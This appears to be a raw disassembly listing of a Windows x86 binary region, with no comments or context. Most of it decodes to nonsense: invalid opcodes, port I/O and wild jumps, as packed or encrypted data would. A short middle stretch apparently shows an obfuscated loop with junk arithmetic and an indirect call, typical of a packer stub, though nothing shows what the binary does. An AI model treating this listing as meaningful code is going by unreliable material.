  405816:	cmp    BYTE PTR [esi+0x3d01c35],ch
  40581c:	in     eax,0xa4
  40581e:	add    BYTE PTR [edx],ch
  405820:	adc    al,0xf1
  405822:	stos   DWORD PTR es:[edi],eax
  405823:	jl     0x4057ec
  405825:	mov    dl,0xbd
  405827:	xchg   esp,eax
  405828:	lods   al,BYTE PTR ds:[esi]
  405829:	adc    ecx,DWORD PTR [ebx-0x5302833a]
  40582f:	pushf  
  405830:	fldcw  WORD PTR [ebx-0x23dd0d46]
  405836:	xchg   ecx,eax
  405837:	jp     0x405879
  405839:	aad    0x18
  40583b:	mov    bh,0x6a
  40583d:	arpl   sp,ax
  40583f:	add    esp,eax
  405841:	in     al,0xe7
  405843:	int3   
  405844:	clc    
  405845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405846:	fyl2x  
  405848:	test   BYTE PTR [ebx+0x55c160ae],dl
  40584e:	rol    bh,cl
  405850:	pop    edi
  405851:	ret    
  405852:	mov    ebp,0xf9be0a44
  405857:	imul   di,WORD PTR [edx-0x3b1db8ee],0x43ab
  405860:	mov    esp,0x580bbfef
  405865:	out    0xd6,al
  405867:	mov    ah,0xb3
  405869:	jo     0x40582d
  40586b:	iret   
  40586c:	and    al,0xa0
  40586e:	xlat   BYTE PTR ds:[ebx]
  40586f:	pop    esp
  405870:	mov    bh,BYTE PTR [ebp+0x7d369265]
  405876:	imul   ebx,DWORD PTR [ecx+0x2d],0xfffffffc
  40587a:	or     DWORD PTR [edi],0xffffffb4
  40587d:	(bad)  
  40587e:	clc    
  40587f:	repz or ebx,DWORD PTR [ebp+esi*2+0x50]
  405884:	int    0x58
  405886:	mov    DWORD PTR [edi+0x360228ef],eax
  40588c:	rol    DWORD PTR [esi+0x30addb82],1
  405892:	jbe    0x4058a2
  405894:	aaa    
  405895:	loopne 0x40582a
  405897:	pop    eax
  405898:	in     al,dx
  405899:	outs   dx,DWORD PTR ds:[esi]
  40589a:	cmp    BYTE PTR ds:0xf3e11300,ah
  4058a0:	mov    ds:0x46cb2098,eax
  4058a5:	data16 jae 0x40585a
  4058a8:	bound  esp,QWORD PTR [esp+eiz*8]
  4058ab:	cdq    
  4058ac:	xchg   esi,eax
  4058ad:	adc    al,BYTE PTR [ecx]
  4058af:	mov    eax,DWORD PTR [esi]
  4058b1:	pop    DWORD PTR [esi-0x5be39be5]
  4058b7:	push   esi
  4058b8:	and    DWORD PTR [edi],edi
  4058ba:	je     0x405864
  4058bc:	out    0xe9,al
  4058be:	int3   
  4058bf:	loopne 0x40591d
  4058c1:	sti    
  4058c2:	pop    ecx
  4058c3:	aaa    
  4058c4:	aam    0xf
  4058c6:	loope  0x4058c9
  4058c8:	sbb    eax,0x4126511
  4058cd:	inc    esi
  4058ce:	push   edi
  4058cf:	pusha  
  4058d0:	clc    
  4058d1:	xchg   ebx,eax
  4058d2:	bound  ebx,QWORD PTR [eax+0x35]
  4058d5:	xor    ecx,esp
  4058d7:	jge    0x405925
  4058d9:	sbb    DWORD PTR [ebx],ebp
  4058db:	mov    dl,0x92
  4058dd:	add    bl,dl
  4058df:	loopne 0x40588c
  4058e1:	jg     0x405960
  4058e3:	popa   
  4058e4:	adc    BYTE PTR [edx],ch
  4058e6:	pop    ebx
  4058e7:	popf   
  4058e8:	lock aad 0x20
  4058eb:	(bad)  
  4058ec:	shl    DWORD PTR ds:0x123319df,1
  4058f2:	lds    edi,FWORD PTR [eax+edi*1+0x70d41d39]
  4058f9:	dec    ebx
  4058fa:	dec    edi
  4058fb:	stc    
  4058fc:	gs out 0xe9,al
  4058ff:	pop    es
  405900:	add    al,0xdb
  405902:	and    ebp,DWORD PTR [edi*1+0x19ef2dd9]
  405909:	xchg   edx,eax
  40590a:	or     al,BYTE PTR [ebx]
  40590c:	sub    al,0xd6
  40590e:	shl    DWORD PTR [ecx-0xf],cl
  405911:	out    dx,al
  405912:	imul   edi,DWORD PTR [ebx-0x76],0x21433392
  405919:	shl    DWORD PTR ds:[ecx-0x313a6261],0x84
  405921:	hlt    
  405922:	lahf   
  405923:	mov    dl,0xfe
  405925:	mov    eax,0x8ea34337
  40592a:	sbb    dh,0x2e
  40592d:	loope  0x40591a
  40592f:	test   al,0x43
  405931:	xor    DWORD PTR [ebp+0x6b],edi
  405934:	rcr    BYTE PTR [esp+ecx*2],1
  405937:	mov    edi,0x1ed3a41b
  40593c:	adc    DWORD PTR [ebx+0xc],edx
  40593f:	mov    ds:0x693abe4,eax
  405944:	(bad)  
  405945:	(bad)  
  405948:	cdq    
  405949:	mov    WORD PTR [ebx-0x5fc81f30],gs
  40594f:	neg    DWORD PTR [edx-0x7b]
  405952:	mov    ds:0x53101872,al
  405957:	push   cs
  405958:	mov    WORD PTR [edx],gs
  40595a:	sbb    eax,0x8fa02eeb
  40595f:	jns    0x40596b
  405961:	inc    edx
  405962:	imul   ecx,DWORD PTR [ebx+0x6d],0xffffff93
  405966:	stos   DWORD PTR es:[edi],eax
  405967:	dec    esp
  405968:	mov    ebx,0x653a6716
  40596d:	dec    ebp
  40596e:	xor    al,BYTE PTR ds:0xe902af06
  405974:	in     al,0xd
  405976:	mov    al,0xa4
  405978:	or     BYTE PTR [ebp+0x29],cl
  40597b:	push   0x34
  40597d:	jmp    0x40596f
  40597f:	fcomi  st,st(5)
  405981:	arpl   WORD PTR [ebx],ax
  405983:	bound  ebp,QWORD PTR ds:0xb19d5dfa
  405989:	xchg   ebx,eax
  40598a:	jne    0x4059da
  40598c:	ficomp WORD PTR [edi-0x75207007]
  405992:	shl    ebx,0xc2
  405995:	adc    al,0x17
  405997:	enter  0xdc20,0x64
  40599b:	lock les esp,FWORD PTR [eax+0x5c]
  40599f:	cmp    dl,BYTE PTR [edi-0x6e990a43]
  4059a5:	xor    edi,DWORD PTR [ebx-0x45]
  4059a8:	sbb    DWORD PTR [ebx-0x38],0x43
  4059ac:	jno    0x405968
  4059ae:	sub    ebp,DWORD PTR gs:[edi+0x65]
  4059b2:	cwde   
  4059b3:	iret   
  4059b4:	inc    eax
  4059b5:	punpcklbw mm5,mm3
  4059b8:	retf   
  4059b9:	mov    edi,0x9d4b9c27
  4059be:	cli    
  4059bf:	outs   dx,BYTE PTR ds:[esi]
  4059c0:	pop    edx
  4059c1:	idiv   BYTE PTR [edx+eax*8]
  4059c4:	out    0x47,al
  4059c6:	not    BYTE PTR [esi]
  4059c8:	inc    edi
  4059c9:	dec    esp
  4059ca:	mov    esp,0x7ef97e5a
  4059cf:	push   0xffffff9f
  4059d1:	jne    0x405a2e
  4059d3:	xchg   edx,eax
  4059d4:	data16 gs je 0x405a0b
  4059d8:	xor    dh,BYTE PTR ss:[ecx+0x67]
  4059dc:	inc    esi
  4059dd:	dec    edx
  4059de:	lock pop ds
  4059e0:	xchg   ecx,eax
  4059e1:	and    ecx,DWORD PTR [ebx]
  4059e3:	mov    ebp,0x37b64a9b
  4059e8:	popf   
  4059e9:	pop    ss
  4059ea:	jge    0x4059e8
  4059ec:	fild   WORD PTR [edi-0x52bbc65a]
  4059f2:	push   es
  4059f3:	js     0x405987
  4059f5:	mov    esp,0xf39f5094
  4059fa:	push   esp
  4059fb:	sub    DWORD PTR [esi+0x60],eax
  4059fe:	jns    0x4059c3
  405a00:	xor    eax,ebx
  405a02:	sub    ch,dl
  405a04:	ror    BYTE PTR [esi+eiz*1],0x12
  405a08:	(bad)  
  405a09:	bound  ebx,QWORD PTR [eax+ebx*8+0x29]
  405a0d:	push   ds
  405a0e:	pop    esi
  405a0f:	inc    edi
  405a10:	xchg   ecx,eax
  405a11:	out    dx,al
  405a12:	cs cmp eax,0xa43a8349
  405a18:	dec    esi
  405a19:	jl     0x405a96
  405a1b:	aam    0x32
  405a1d:	adc    esp,ebx
  405a1f:	jnp    0x405a22
  405a21:	add    al,0xfd
  405a23:	jge    0x405a21
  405a25:	pop    ecx
  405a26:	mov    ecx,0x9f5b62c7
  405a2b:	jg     0x405a33
  405a2d:	mov    DWORD PTR [ebp+0x52],0x342655de
  405a34:	dec    esp
  405a35:	out    0xa6,al
  405a37:	xlat   BYTE PTR ds:[ebx]
  405a38:	ror    ch,cl
  405a3a:	test   eax,0xf0d08d1c
  405a3f:	xchg   eax,ebx
  405a41:	cld    
  405a42:	pop    ss
  405a43:	fmul   DWORD PTR [edi+ecx*4+0x1b09b480]
  405a4a:	cmp    BYTE PTR [edx+edi*1+0x14af9a4a],dl
  405a51:	fidiv  DWORD PTR [ebx+edx*1]
  405a54:	jge    0x4059fe
  405a56:	adc    dh,BYTE PTR [ebp-0x4eda0ada]
  405a5c:	push   ds
  405a5d:	mov    ds:0x5496a05b,al
  405a62:	pop    ebx
  405a63:	mov    DWORD PTR [esp+edx*8-0xdb0c753],ebp
  405a6a:	sbb    edi,DWORD PTR [ecx]
  405a6c:	push   eax
  405a6d:	xchg   esi,eax
  405a6e:	or     ecx,DWORD PTR [edi]
  405a70:	sub    cl,bl
  405a72:	dec    ebp
  405a73:	xchg   ebp,eax
  405a74:	dec    edx
  405a75:	add    al,0x1b
  405a77:	mov    ds:0xaba289fe,eax
  405a7c:	iret   
  405a7d:	pop    edi
  405a7e:	and    BYTE PTR [eax],ch
  405a80:	div    DWORD PTR [esi-0x3889244b]
  405a86:	jno    0x405a27
  405a88:	bound  ebx,QWORD PTR [eax+esi*1+0xb]
  405a8c:	mov    ecx,0xc380d5a8
  405a91:	loopne 0x405a31
  405a93:	mov    eax,0x4a85542
  405a98:	or     ebp,DWORD PTR [edi]
  405a9a:	add    eax,0x50a11a2b
  405a9f:	sbb    al,0xaf
  405aa1:	cmc    
  405aa2:	stos   DWORD PTR es:[edi],eax
  405aa3:	not    BYTE PTR [ecx-0x10f1d19f]
  405aa9:	xor    DWORD PTR [eax+0x27],0xe
  405aad:	cdq    
  405aae:	push   ss
  405aaf:	bnd js 0x405a36
  405ab2:	pop    esp
  405ab3:	fs sub al,0xc0
  405ab6:	mov    ebx,esi
  405ab8:	scas   al,BYTE PTR es:[edi]
  405ab9:	fs pop ecx
  405abb:	sub    BYTE PTR [esi+ebx*4+0x4c],dh
  405abf:	iret   
  405ac0:	sub    ah,ah
  405ac2:	cmp    eax,0x29e3f1d7
  405ac7:	popf   
  405ac8:	pminub mm6,QWORD PTR [edx]
  405acb:	fadd   QWORD PTR [eax-0x7e]
  405ace:	mov    edx,0x5100ce61
  405ad3:	xor    edi,DWORD PTR [ebx-0x7f589f4f]
  405ad9:	sbb    eax,0x286b187b
  405ade:	mov    esp,0x432e3fb5
  405ae3:	xor    ecx,esp
  405ae5:	add    ch,bh
  405ae7:	loope  0x405ad2
  405ae9:	xchg   ebp,eax
  405aea:	adc    bh,al
  405aec:	jge    0x405ac8
  405aee:	mov    bl,0x78
  405af0:	in     eax,0x44
  405af2:	and    eax,0x45e241b8
  405af7:	popa   
  405af8:	repnz sub ebp,DWORD PTR [eax]
  405afb:	test   al,0x1c
  405afd:	retf   
  405afe:	sar    BYTE PTR [eax],cl
  405b00:	mov    dl,0xb8
  405b02:	(bad)  
  405b03:	ja     0x405b11
  405b05:	(bad)  [ebp-0x10]
  405b08:	(bad)  
  405b09:	jns    0x405a9a
  405b0b:	add    ah,BYTE PTR [esi-0x17]
  405b0e:	xor    edi,DWORD PTR [eax-0x50]
  405b11:	je     0x405b6b
  405b13:	aam    0x51
  405b15:	mov    cl,al
  405b17:	push   0x450442d0
  405b1c:	popf   
  405b1d:	in     al,dx
  405b1e:	sbb    edi,ebx
  405b20:	adc    esp,esi
  405b22:	imul   ebp,DWORD PTR [ecx-0x6b7ebafd],0x5fcfb2de
  405b2c:	inc    edi
  405b2d:	push   ss
  405b2e:	push   ss
  405b2f:	xchg   esp,eax
  405b30:	add    DWORD PTR [ebp-0x79],ecx
  405b33:	adc    dl,cl
  405b35:	test   edi,edx
  405b37:	mov    ecx,DWORD PTR [ebp-0x10]
  405b3a:	sub    DWORD PTR ds:0x42a266,0x42a2e2
  405b44:	xor    eax,esi
  405b46:	add    DWORD PTR ds:0x42a2ea,0x138
  405b50:	xor    ecx,esi
  405b52:	lea    ecx,[eax+ecx*1+0x64e5e2]
  405b59:	and    DWORD PTR ds:0x42a26a,0x0
  405b63:	xor    eax,eax
  405b65:	or     eax,DWORD PTR ds:0x42a26a
  405b6b:	inc    eax
  405b6c:	mov    ds:0x42a26a,eax
  405b71:	cmp    DWORD PTR ds:0x42a26a,0x7
  405b78:	jge    0x405bae
  405b7e:	jmp    0x405b89
  405b83:	call   DWORD PTR ds:0x42a3da
  405b89:	cmp    DWORD PTR ds:0x42a26a,0x6
  405b90:	jne    0x405ba1
  405b96:	mov    eax,ds:0x42a26a
  405b9b:	inc    eax
  405b9c:	mov    ds:0x42a26a,eax
  405ba1:	cmp    DWORD PTR ds:0x42a26a,0x11
  405ba8:	jb     0x405b63
  405bae:	mov    eax,DWORD PTR [ebp-0xc]
  405bb1:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  405bbb:	xor    edx,edx
  405bbd:	or     DWORD PTR ds:0x42a29e,0x16dc
  405bc7:	div    ecx
  405bc9:	or     eax,ecx
  405bcb:	mov    eax,DWORD PTR [ebp-0x8]
  405bce:	xor    ecx,ecx
  405bd0:	xor    ecx,DWORD PTR ds:0x42a292
  405bd6:	sbb    DWORD PTR ds:0x42a2fa,ecx
  405bdc:	mov    ecx,DWORD PTR [ebp-0x10]
  405bdf:	xor    eax,esi
  405be1:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  405beb:	xor    ecx,esi
  405bed:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  405bf7:	sub    eax,ecx
  405bf9:	cmp    edx,eax
  405bfb:	jmp    0x407f54
  405c00:	mov    esp,0x8265841a
  405c05:	loope  0x405ba5
  405c07:	add    BYTE PTR [eax+0x74],0x97
  405c0b:	fistp  DWORD PTR es:[edi]
  405c0e:	(bad)  
  405c0f:	xchg   esp,eax
  405c10:	or     edi,DWORD PTR [ecx]
  405c12:	add    DWORD PTR [ebx-0x7c7ca1b9],0xffffffee
  405c19:	fldenv [ebx-0x28b21d9]
  405c1f:	cmp    eax,0x62bb5caf
  405c24:	les    ebp,FWORD PTR [ebx-0x62]
  405c27:	pop    ds
  405c28:	or     al,0xac
  405c2a:	xor    DWORD PTR [ebx-0x7f],edi
  405c2d:	dec    esp
  405c2e:	pusha  
  405c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c30:	cmp    al,0x70
  405c32:	std    
  405c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c34:	and    ah,BYTE PTR [ebx+0x1a]
  405c37:	scas   al,BYTE PTR es:[edi]
  405c38:	sub    DWORD PTR fs:[ebx-0x2e],edx
  405c3c:	dec    ebp
  405c3d:	inc    ebx
  405c3e:	outs   dx,DWORD PTR ds:[esi]
  405c3f:	xor    edi,DWORD PTR [esi+0xea38807]
  405c45:	cdq    
  405c46:	push   ds
  405c47:	popa   
  405c48:	(bad)  
  405c49:	std    
  405c4a:	test   DWORD PTR [ebx+ecx*4-0x37],0x1a3df7f5
  405c52:	add    al,0x22
  405c54:	lds    ebx,FWORD PTR [esi-0x7047f6a5]
  405c5a:	mov    cl,BYTE PTR ds:0xca6d98fa
  405c60:	fidiv  DWORD PTR ds:0xbd8c352a
  405c66:	mov    esp,0x9942c2ee
  405c6b:	mov    esp,0x41bcc1f4
  405c70:	adc    DWORD PTR [edx+0x78a3049],0xffffffe7
  405c77:	stc    
  405c78:	jmp    0xe9ed4ae8
  405c7d:	dec    edi
  405c7e:	xchg   ebp,eax
  405c7f:	add    eax,0xda331a15
  405c84:	jne    0x405cee
  405c86:	adc    esp,DWORD PTR [ecx]
  405c88:	mov    eax,?
  405c8a:	add    bl,BYTE PTR [ebp+edx*4+0x5e]
  405c8e:	scas   al,BYTE PTR es:[edi]
  405c8f:	mov    ebp,0x3aa524
  405c94:	adc    cl,BYTE PTR [ecx+0x53a8047b]
  405c9a:	push   ebp
  405c9b:	mov    ds:0xcd1a5f9,al
  405ca0:	arpl   WORD PTR [ecx+0x48],cx
  405ca3:	or     esp,ebp
  405ca5:	push   esp
  405ca6:	jno    0x405cd0
  405ca8:	in     al,dx
  405ca9:	stos   BYTE PTR es:[edi],al
  405caa:	xor    BYTE PTR [ebx+0x2678fd70],0xf
  405cb1:	hlt    
  405cb2:	add    DWORD PTR [eax+0x7db6b351],ebp
  405cb8:	add    eax,esi
  405cba:	xchg   ebp,eax
  405cbb:	pop    eax
  405cbc:	mov    al,ds:0x9e198ca9
  405cc1:	push   0xfffffff3
  405cc3:	jb     0x405c86
  405cc5:	in     al,0x63
  405cc7:	pop    ebx
  405cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cc9:	mov    ch,0x70
  405ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ccc:	mov    ch,0xc
  405cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ccf:	xor    eax,0xc961e7e8
  405cd4:	repz scas eax,DWORD PTR es:[edi]
  405cd6:	push   0xae44c5a1
  405cdb:	push   ds
  405cdc:	inc    ecx
  405cdd:	iret   
  405cde:	dec    edx
  405cdf:	sbb    DWORD PTR [esi-0x2c6ad348],edx
  405ce5:	xchg   ebx,eax
  405ce6:	pop    edx
  405ce7:	mov    dl,0x0
  405ce9:	retf   
  405cea:	mov    DWORD PTR [ecx+ecx*2+0x50],esi
  405cee:	test   eax,0xd1edba69
  405cf3:	scas   eax,DWORD PTR es:[edi]
  405cf4:	test   BYTE PTR [ecx-0x36e72baa],bl
  405cfa:	sbb    BYTE PTR es:[edx+0x29be0438],bl
  405d01:	std    
  405d02:	xor    BYTE PTR [eax],dl
  405d04:	test   eax,0x1ec3dac9
  405d09:	mov    al,ds:0x3124c9c5
  405d0e:	sub    eax,0x3b8ace1a
  405d13:	pop    edx
  405d14:	cmp    ebp,DWORD PTR [ecx]
  405d16:	add    DWORD PTR [edi],ebp
  405d18:	mov    cl,0xc9
  405d1a:	loope  0x405cc7
  405d1c:	pop    es
  405d1d:	jo     0x405d72
  405d1f:	dec    edx
  405d20:	repnz daa 
  405d22:	idiv   dh
  405d24:	or     dh,cl
  405d26:	das    
  405d27:	pop    ds
  405d28:	push   cs
  405d29:	pop    ebx
  405d2a:	pop    esp
  405d2b:	div    BYTE PTR [esi-0x9]
  405d2e:	jecxz  0x405d96
  405d30:	into   
  405d31:	inc    esi
  405d32:	(bad)  [ebp+0x5019e3c8]
  405d38:	stc    
  405d39:	adc    DWORD PTR [edi-0x5a0240dd],0xc80b1c7d
  405d43:	xchg   ecx,eax
  405d44:	dec    ecx
  405d45:	pushf  
  405d46:	ja     0x405d98
  405d48:	sub    DWORD PTR [ecx+eax*2],ecx
  405d4b:	pop    esp
  405d4c:	mov    bh,0x5c
  405d4e:	stc    
  405d4f:	pop    ds
  405d50:	test   ah,dh
  405d52:	aas    
  405d53:	pusha  
  405d54:	popf   
  405d55:	test   DWORD PTR [edi+0x27535e93],0x2c029c2d
  405d5f:	inc    ecx
  405d60:	xchg   ebx,eax
  405d61:	out    dx,eax
  405d62:	jl     0x405d29
  405d64:	jb     0x405d41
  405d66:	sbb    BYTE PTR [esi-0x3bb227ae],bh
  405d6c:	arpl   WORD PTR [edi+0x11],ax
  405d6f:	dec    ecx
  405d70:	retf   
  405d71:	cmp    BYTE PTR [edi-0x379f085d],dh
  405d77:	xchg   ebp,eax
  405d78:	in     eax,0xcd
  405d7a:	test   al,0xcf
  405d7c:	neg    DWORD PTR [ebp-0x52c9c484]
  405d82:	stos   DWORD PTR es:[edi],eax
  405d83:	dec    eax
  405d84:	stc    
  405d85:	imul   ecx,DWORD PTR gs:[esi+0x36],0xffffffb4
  405d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d8b:	inc    edi
  405d8c:	or     eax,DWORD PTR [eax]
  405d8e:	lds    ecx,FWORD PTR ds:0xda5f528
  405d94:	xor    ch,BYTE PTR [edx]
  405d96:	or     eax,0xb45957fe
  405d9b:	(bad)  
  405d9c:	cmp    DWORD PTR [edx-0x240e27fd],edi
  405da2:	or     al,0xec
  405da4:	push   esi
  405da5:	loopne 0x405e24
  405da7:	cmp    BYTE PTR [eax],ch
  405da9:	jp     0x405d80
  405dab:	push   ds
  405dac:	mov    ecx,0x1427621a
  405db1:	in     eax,dx
  405db2:	pop    eax
  405db3:	mov    edx,0x43189cd0
  405db8:	add    BYTE PTR [edx+0x3d9042f2],al
  405dbe:	ret    0x2ce2
  405dc1:	inc    ecx
  405dc2:	pop    es
  405dc3:	call   0xf910b137
  405dc8:	or     eax,0xa270e901
  405dcd:	xchg   ebx,eax
  405dce:	sub    DWORD PTR [eax+0x7e510627],0x7e1444e3
  405dd8:	sahf   
  405dd9:	lods   eax,DWORD PTR ds:[esi]
  405dda:	js     0x405d82
  405ddc:	icebp  
  405ddd:	cmp    cl,cl
  405ddf:	dec    edx
  405de0:	sbb    BYTE PTR [esi],0xd7
  405de3:	or     BYTE PTR [ebx+ebp*8],al
  405de6:	sbb    dh,ah
  405de8:	cli    
  405de9:	mov    edx,0x1e0d00fb
  405dee:	(bad)  
  405df0:	shl    DWORD PTR [edi-0x62da8ed],0x6
  405df7:	pushf  
  405df8:	sub    al,0xc6
  405dfa:	sub    edi,DWORD PTR [ebx-0xb]
  405dfd:	cld    
  405dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dff:	push   ebp
  405e00:	jns    0x405dbd
  405e02:	and    al,0xd3
  405e04:	pusha  
  405e05:	inc    eax
  405e06:	neg    DWORD PTR [eax]
  405e08:	ficomp WORD PTR [ebx+0xaab0303]
  405e0e:	mov    edi,0xafbd76e8
  405e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e14:	push   ds
  405e15:	or     esi,DWORD PTR [eax-0x31]
  405e18:	in     al,0x55
  405e1a:	inc    edx
  405e1b:	loop   0x405e52
  405e1d:	sub    esp,DWORD PTR [edx-0x3f]
  405e20:	sbb    DWORD PTR ds:0xeb9d4291,0xc9b7ce2b
  405e2a:	xor    bh,BYTE PTR [eiz*8-0x854847f]
  405e31:	inc    ecx
  405e32:	out    dx,al
  405e33:	mov    BYTE PTR [ebx-0x5e],dh
  405e36:	mov    bl,0xc
  405e38:	imul   edi,DWORD PTR [edi+edi*4],0xffffffe7
  405e3c:	ret    0xce7e
  405e3f:	xchg   ah,bl
  405e41:	ss push cs
  405e43:	in     eax,dx
  405e44:	sbb    ebp,DWORD PTR [edi+0x3d]
  405e47:	shl    BYTE PTR [ecx-0x39],cl
  405e4a:	rol    ebp,1
  405e4c:	aam    0x23
  405e4e:	popa   
  405e4f:	ss std 
  405e51:	jne    0x405ddd
  405e53:	(bad)  
  405e54:	jbe    0x405e6a
  405e56:	or     eax,0xcc174ec3
  405e5b:	jns    0x405eb6
  405e5d:	in     eax,dx
  405e5e:	pop    eax
  405e5f:	jge    0x405e5c
  405e61:	sbb    edi,eax
  405e63:	add    al,0x80
  405e65:	dec    eax
  405e66:	dec    ebp
  405e67:	mov    al,ds:0xc144f4eb
  405e6c:	ds mov esi,0xb4486eef
  405e72:	addr16 repnz dec eax
  405e75:	mov    ah,0xb3
  405e77:	push   ds
  405e78:	cmp    BYTE PTR [eax],bl
  405e7a:	xchg   edx,eax
  405e7b:	cmp    eax,0xff83ef3e
  405e80:	ret    
  405e81:	sbb    al,0x7f
  405e83:	dec    esi
  405e84:	xchg   esi,eax
  405e85:	dec    edx
  405e86:	fadd   QWORD PTR [eax-0x46db1af]
  405e8c:	sar    BYTE PTR [esp+eiz*8],0xa0
  405e90:	sub    ch,0xa
  405e93:	jmp    0x9010db7c
  405e98:	fnstsw WORD PTR [eiz*1-0x178a1f4f]
  405e9f:	fidiv  DWORD PTR [ebp+0x67b36c11]
  405ea5:	cdq    
  405ea6:	push   edx
  405ea7:	adc    esi,ebx
  405ea9:	loopne 0x405f03
  405eab:	fimul  DWORD PTR [ecx+0x2a]
  405eae:	arpl   WORD PTR [edi],dx
  405eb0:	and    ebx,DWORD PTR [edi+0x61878860]
  405eb6:	mov    bl,0x3d
  405eb8:	or     eax,0xcccaef6
  405ebd:	fwait
  405ebe:	push   cs
  405ebf:	pop    edx
  405ec0:	nop
  405ec1:	lods   eax,DWORD PTR ds:[esi]
  405ec2:	inc    edx
  405ec3:	mov    ch,0x2c
  405ec5:	cwde   
  405ec6:	fistp  WORD PTR [ebx+0x6f]
  405ec9:	fadd   st,st(5)
  405ecb:	inc    esp
  405ecc:	fwait
  405ecd:	push   eax
  405ece:	fidiv  DWORD PTR [edi-0x28]
  405ed1:	sub    bh,bh
  405ed3:	inc    esp
  405ed4:	cmc    
  405ed5:	pop    edx
  405ed6:	push   esp
  405ed7:	dec    edx
  405ed8:	push   ss
  405ed9:	adc    eax,0x542d93c9
  405ede:	enter  0x7cd9,0xd2
  405ee2:	sti    
  405ee3:	xchg   edi,eax
  405ee4:	inc    edi
  405ee5:	lahf   
  405ee6:	and    ebx,esi
  405ee8:	stos   DWORD PTR es:[edi],eax
  405ee9:	pop    ebp
  405eea:	adc    al,0x77
  405eec:	rol    DWORD PTR ss:[ecx],cl
  405eef:	repnz icebp 
  405ef1:	push   ecx
  405ef2:	dec    BYTE PTR [ebx+0x5a3e0791]
  405ef8:	rcl    dh,0x8d
  405efb:	lds    ebp,FWORD PTR [edx-0x29]
  405efe:	jns    0x405f78
  405f00:	jp     0x405ee2
  405f02:	inc    eax
  405f03:	cwde   
  405f04:	mov    al,0x66
  405f06:	add    al,0x61
  405f08:	sub    ah,BYTE PTR [ecx-0x9]
  405f0b:	inc    eax
  405f0c:	repz clc 
  405f0e:	jb     0x405ea8
  405f10:	xor    al,cl
  405f12:	mov    ds:0x3bb40dc8,al
  405f17:	rcr    BYTE PTR [ecx+0x46],cl
  405f1a:	dec    ebx
  405f1b:	xor    BYTE PTR [edi+0x3f7477f3],bl
  405f21:	fsubp  st(1),st
  405f23:	aad    0x3c
  405f25:	sub    BYTE PTR [ebx],ah
  405f27:	jmp    0x30a56148
  405f2c:	inc    esp
  405f2d:	aas    
  405f2e:	retf   
  405f2f:	sub    BYTE PTR [eax-0x1c],dh
  405f32:	jl     0x405f2b
  405f34:	dec    esi
  405f35:	fstp   QWORD PTR [edx+0x4b14b302]
  405f3b:	mov    bh,bh
  405f3d:	or     BYTE PTR [ecx],cl
  405f3f:	sub    DWORD PTR [ebx-0x209615ac],ebx
  405f45:	or     eax,DWORD PTR [edi+0x157e1471]
  405f4b:	fisub  WORD PTR fs:[edx]
  405f4e:	and    al,bl
  405f50:	mov    al,ds:0x276fe4c1
  405f55:	or     BYTE PTR [eax-0x5a86b5c5],bh
  405f5b:	sbb    DWORD PTR [eax-0x4fbf6b9c],edi
  405f61:	std    
  405f62:	fisubr DWORD PTR [ecx-0x194fccf8]
  405f68:	cs test al,0xb0
  405f6b:	sbb    ebp,ebx
  405f6d:	pop    ds
  405f6e:	js     0x405f74
  405f70:	pop    ss
  405f71:	mov    al,0xef
  405f73:	push   es
  405f74:	jo     0x405f12
  405f76:	cld    
  405f77:	(bad)  
  405f78:	dec    ebp
  405f79:	ins    DWORD PTR es:[edi],dx
  405f7a:	les    ebx,FWORD PTR gs:[esi]
  405f7d:	add    dh,BYTE PTR [ecx+0xf212b00]
  405f83:	aas    
  405f84:	sbb    al,0x3c
  405f86:	jle    0x405fc6
  405f88:	ja     0x405ff0
  405f8a:	shr    BYTE PTR [ecx+ecx*1+0x6f],cl
  405f8e:	push   0x41ac065b
  405f93:	inc    ebx
  405f94:	ins    DWORD PTR es:[edi],dx
  405f95:	lahf   
  405f96:	xor    ebp,DWORD PTR [edi-0x21]
  405f99:	stos   DWORD PTR es:[edi],eax
  405f9a:	push   eax
  405f9b:	mov    ds:0x14a64fbc,eax
  405fa0:	jmp    0x8b316f8c
  405fa5:	mov    ch,0x9e
  405fa7:	mov    esp,0x6c25e464
  405fac:	mov    ebp,0xc95c8de1
  405fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb2:	add    al,0xba
  405fb4:	inc    esi
  405fb5:	mov    cl,0x43
  405fb7:	mov    ah,0xd1
  405fb9:	or     BYTE PTR [edx+0x3c],bl
  405fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fbd:	cmp    eax,DWORD PTR [eax-0x66]
  405fc0:	mov    ds,edx
  405fc2:	sub    eax,0x9f898232
  405fc7:	dec    ecx
  405fc8:	fdiv   DWORD PTR [ebx+0x5a]
  405fcb:	add    eax,0x815df3f0
  405fd0:	and    al,dl
  405fd2:	in     eax,0x96
  405fd4:	or     BYTE PTR [ecx-0x1e],cl
  405fd7:	dec    ebp
  405fd8:	dec    esi
  405fd9:	xchg   esp,eax
  405fda:	xor    al,0xb0
  405fdc:	in     al,dx
  405fdd:	(bad)  
  405fde:	sbb    dl,dh
  405fe0:	repnz or BYTE PTR [eax+0x6b07bc51],al
  405fe7:	cs mov edi,0x54fbd491
  405fed:	cmp    DWORD PTR [edi+ebp*2+0x47f66afd],esp
  405ff4:	pop    esp
  405ff5:	mov    al,ds:0xaf11c2a
  405ffa:	in     eax,0x5f
  405ffc:	lock xchg edi,eax
  405ffe:	call   0xef66e34b
  406003:	jmp    DWORD PTR [ecx-0x15bc0013]
  406009:	adc    edi,edx
  40600b:	retf   
  40600c:	adc    al,0x2e
  40600e:	pusha  
  40600f:	sub    BYTE PTR [ebx-0x13],bl
  406012:	push   eax
  406013:	inc    edi
  406014:	push   ds
  406015:	and    dh,BYTE PTR [edi]
  406017:	ins    BYTE PTR es:[edi],dx
  406018:	(bad)  
  406019:	xchg   esp,eax
  40601a:	ins    DWORD PTR es:[edi],dx
